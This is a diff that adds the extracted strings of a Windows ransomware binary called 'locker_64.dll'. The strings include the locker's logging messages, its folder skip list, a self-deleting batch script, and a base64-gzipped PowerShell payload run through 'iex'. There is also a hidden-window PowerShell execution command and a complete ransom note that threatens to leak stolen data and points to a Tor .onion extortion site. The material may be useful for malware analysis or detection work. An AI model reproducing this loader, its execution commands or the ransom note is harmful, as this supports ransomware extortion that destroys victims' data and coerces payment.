@@ -1,0 +1,251 @@
+!This program cannot be run in DOS mode.
+.rdata
+@.data
+.pdata
+@.reloc
+SUVWATAUAVAWH
+8A_A^A]A\_^][
+WATAUAVAWH
+A_A^A]A\_
+t$ WATAUAVAWH
+A_A^A]A\_
+x ATAVAWH
+@A_A^A\
+` UAVAWH
+f9:t"L
+WATAUAVAWH
+ A_A^A]A\_
+u'f95C
+SeTakeOwnershipPrivilege
+SeRestorePrivilege
+%CLIENT_ID%
+0123456789abcdef
+attrib -s -r -h %1
+del /F /Q %1
+if exist %1 goto l
+del %0 
+locker_64.dll
+DllInstall
+DllRegisterServer
+_vsnwprintf
+_getch
+msvcrt.dll
+GetVolumeInformationW
+FindFirstFileW
+HeapFree
+FindNextFileW
+lstrlenW
+FindClose
+GetLastError
+lstrcatW
+HeapAlloc
+LocalFree
+GetProcessHeap
+lstrcpyW
+GetCurrentProcess
+WriteFile
+CreateFileW
+CloseHandle
+QueryPerformanceFrequency
+QueryPerformanceCounter
+ReadFile
+TerminateProcess
+CreatePipe
+SetErrorMode
+PeekNamedPipe
+GetTempPathW
+CreateMutexW
+WaitForSingleObject
+DeleteFileW
+GetWindowsDirectoryW
+GetCurrentProcessId
+CreateProcessW
+GetTickCount
+GetFileSizeEx
+SetEndOfFile
+GetFileAttributesW
+UnmapViewOfFile
+SetFileAttributesW
+SetFileInformationByHandle
+SetFilePointerEx
+CreateFileMappingW
+MapViewOfFile
+DeviceIoControl
+CreateThread
+lstrcmpiW
+GetDriveTypeW
+GetCommandLineW
+GetModuleFileNameW
+ExitProcess
+lstrlenA
+GetComputerNameA
+GetConsoleScreenBufferInfo
+GetStdHandle
+GetTickCount64
+WriteConsoleW
+SetConsoleCursorPosition
+AllocConsole
+KERNEL32.dll
+StrCmpIW
+StrStrIW
+SHRegSetUSValueW
+StrStrIA
+SHLWAPI.dll
+GetNamedSecurityInfoW
+SetNamedSecurityInfoW
+FreeSid
+OpenProcessToken
+LookupPrivilegeValueA
+AllocateAndInitializeSid
+AdjustTokenPrivileges
+SetEntriesInAclA
+CryptReleaseContext
+CryptImportKey
+CryptEncrypt
+CryptAcquireContextW
+CryptDestroyKey
+SetSecurityInfo
+ADVAPI32.dll
+wsprintfW
+USER32.dll
+memset
+uBX)3*
+4c25dbf654bbb62b4f84e2065ff34cb4
+<html>
+<head>
+<title>RECOVERY MANUAL</title>
+</head>
+<body>
+<h1>Your ClientId:</h1>
+      
+%CLIENT_ID%                                                     
+</pre>
+<b>/!\ YOUR NETWORK HAS BEEN HACKED /!\<br>
+All your important files have been encrypted!</b><br>
+Your files are safe! Only encrypted.<br><br>
+ANY ATTEMPT TO RESTORE YOUR FILES WITH THIRD-PARTY SOFTWARE<br>
+WILL PERMANENTLY CORRUPT IT.<br>
+DO NOT MODIFY ENCRYPTED FILES.<br>
+DO NOT RENAME ENCRYPTED FILES.<br><br>
+No software available on internet can help you. We are the only ones able to<br>
+solve your problem.<br><br>
+You can send us 2-3 files and we will decrypt it for free<br>
+to prove we are able to give your files back.<br><br>
+Also we gathered highly confidential/personal data from your network. These data are currently stored on<br>
+a private server. This server will be immediately destroyed after your payment.<br>
+If you won't pay, we will release your data to public or reseller.<br>
+So you can expect your data to be published or improperly used in the near future.<br>
+In this case you will face all legal and reputational consequences of the leak.<br>
+We only desire to get a ransom and we don't aim to damage your reputation or destroy<br>
+your business.<br><br>
+        <hr/>
+<b>Contact us to discuss your next step.</b><br><br>
+<a href="http://4bt5hu4vid5c7uq4ioszgzwi4ix6qon7a226cxowgrnomfgxl5b3wtid.onion/?cid=%CLIENT_ID%                                                     ">http://4bt5hu4vid5c7uq4ioszgzwi4ix6qon7a226cxowgrnomfgxl5b3wtid.onion/?cid=%CLIENT_ID%                                                     </a><br>
+* Note that this server is only available via Tor browser only<br><br>
+Follow the instructions to open the link:<br>
+              1. Type the addres "https://www.torproject.org" in your Internet browser. It opens the Tor site.<br>
+              2. Press "Download Tor", then press "Download Tor Browser Bundle", install and run it.<br>
+              3. Now you have Tor browser. In the Tor Browser open "http://4bt5hu4vid5c7uq4ioszgzwi4ix6qon7a226cxowgrnomfgxl5b3wtid.onion/?cid=%CLIENT_ID%                                                     ". <br>
+              4. Start a chat and follow the further instructions. (Password field should be empty for the first login). <br><br>
+Please note, sometimes our support is away from keyboard, but we will reply shortly.<br>
+Kindly advise you to contact us as soon as possible.<br></b><br>
+</body>
+</html>
+$data = [System.Convert]::FromBase64String("H4sIAAAAAAAACsVae4/cthH/2wb8HYSDi9hA9rL3sGMXSNGrvUkOfub20kOBABuKoiR6xUdIStp1ke/eoXaXM1w7TVAEqA++44+kyOFwniTvnAxi9r3xoTh5uXi9uF0UN4vl7bubfxXv312/vf3Z/axPipk2Woyd1OLB/fgzeM8qJfWp2IiiEp0IovAtq8zoi69Y1xVf/dBLEWLXOzLBDz8uYNzl4uaf1y8Wxevr5WeGf/haQtdviu9EmN0p+a78IHgoZj/0wm2LkyWQ+OK2eO8MF95fV18Wb5kSXxbvWWhjqfj25t2bYpT64nzlhRskF8Xd94ubRYHfFH8r5sXV25fF23e3xaP05evrV4vii7/89aef7q7fvnx3t/zpp7988fgkrqE2TjDeFo8eXgehCqmLicrHD+7/+8H9Av7RRb66fv06rfHh7pPTOMPjTxd7bxmMnS33hM6+NS7+WThn3BUP0uhiKTuhQ7d9YXSQuofWiVgc9cH9XyOJDxcbLmzYLxL49/dHJ7V0ojabuEknXxYnvHVGiQOSYmM7WNcBB+MORWtG4Xwruu5Qo2rBgiWo5Z6gOBGBwmNXxo2yLPiBH6reMLdfMPkkG3wIdj/6g/txBKXJ54pRUAtoD4lOYaUOonEs8s7ns5SVE1VkO3a2zgSQLlEddRXWC97Dnm7zBiBH2N5WLIhPvmDNobxmQ+3HtKB1p1kDe3jAA7Mq63oAe67ciF964VN3boNj2x+vD/i2BVkMrw1fC3cLLUja3c3yKjGmZIqWA/Y8efOPqzdHO/BKbN8znyhhQ9PLtDQlwipbwVRzxIAoArgxQE2soLO20uYbh7sMkDMQGypGnjPQ4YRaH1iaP5TK6MROH/xaNUl4hW5gjyN1wiE1x/OBPGuNs3vupE3j73bYIQv6I6yZdRWZs3agiKNx6yOm8A6m6ZMkcFVRPkYmOTCiuNcHQlag6R7Vg1M+Qp9Wiq464Kur
+$ms = New-Object System.IO.MemoryStream(, $data)
+$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
+$sr.ReadToEnd() | iex
+[ERROR] locker.dir > enum gle=%u name=%s
+[ERROR] locker.dir > get_access gle=%u name=%s
+[ERROR] locker.dir > set_access gle=%u name=%s
+Microsoft Enhanced Cryptographic Provider v1.0
+INIT TIMEOUT
+~%u.tmp
+powershell.exe -windowstyle hidden -c $mypid='%u';[System.IO.File]::ReadAllText('%s')|iex
+[INFO] locker > start init script
+[INFO] locker > finished init script
+%0.8X%0.8X%0.8X%0.8X
+[DENY] locker.check.dbl_run > exists
+[OK] locker.check.dbl_run > ok
+[OK] locker > finished
+[ERROR] locker.file > open gle=%u name=%s
+[ERROR] locker.file > set_access gle=%u name=%s
+[ERROR] locker.file > get_size gle=%u name=%s
+[ERROR] locker.file > map gle=%u name=%s
+[ERROR] locker.file > rename gle=%u name=%s
+[ERROR] locker.file > write_key gle=%u name=%s
+[ERROR] locker.file > crypt gle=%u name=%s
+[OK] locker.file > time=%0.3f size=%0.3f KB speed=%0.3f MB/s name=%s
+[OK] locker.file > time=%0.3f size=%0.3f MB speed=%0.3f MB/s name=%s
+:\Windows\
+:\System Volume Information\
+:\$RECYCLE.BIN\
+:\SYSTEM.SAV
+:\WINNT
+:\$WINDOWS.~BT\
+:\Windows.old\
+:\PerfLog\
+\WindowsApps\
+\Microsoft\Windows\
+\Roaming\Microsoft\
+\Local\Microsoft\
+\LocalLow\Microsoft\
+:\ProgramData\Microsoft\
+\Local\Packages\
+:\ProgramData\Packages\
+\Windows Defender\
+\microsoft shared\
+\Google\Chrome\
+\Mozilla Firefox\
+\Mozilla\Firefox\
+\Internet Explorer\
+\MicrosoftEdge\
+\Tor Browser\
+\AppData\Local\Temp\
+[SKIP] locker.dir.check > black_list name=%s
+[OK] locker.dir.check > name=%s
+[WARN] locker.dir.check > open gle=%u name=%s
+[WARN] locker.dir.check > get_reparse_point gle=%u name=%s
+[WARN] locker.dir.check > unknown_tag tag=%0.8X name=%s
+[SKIP] locker.dir.check > target_visibled target=%s name=%s
+[OK] locker.dir.check > target_hidden target=%s name=%s
+RecoveryManual.html
+[ERROR] locker.dir.enum > malloc gle=%u name=%s
+[ERROR] locker.dir.enum > create_thread gle=%u name=%s
+[SKIP] locker.volume.enum > readonly name=%s
+[OK] locker.volume.enum > name=%s
+================================
+        Lock local drive        
+================================
+       Lock network drive       
+      Lock network shares       
+[WARN] locker.work > not support
+/scan:
+/marker:
+/nodel
+explorer.exe RecoveryManual.html
+Software\Classes\.%0.8X\shell\Open\command
+[ERROR] locker.init > info=rsa gle=%u
+.ReadManual.%0.8X
+\%0.8X.bat
+"%s" "%s"
+==[ STATS ]=======================
+Total crypted:
+%.3f GB
+Crypt Avg:
+%0.3f MB/s
+Files:
+%0.3f files/s
+%u sec
+==[ DIRS ]========================
+Total:
+Skipped:
+Error:
+==[ FILES ]=======================
+Locked:
+==[ FILES SKIPPED ]===============
+Black:
+Manual:
+==[ FILE ERROR ]==================
+Rename:
+Write:
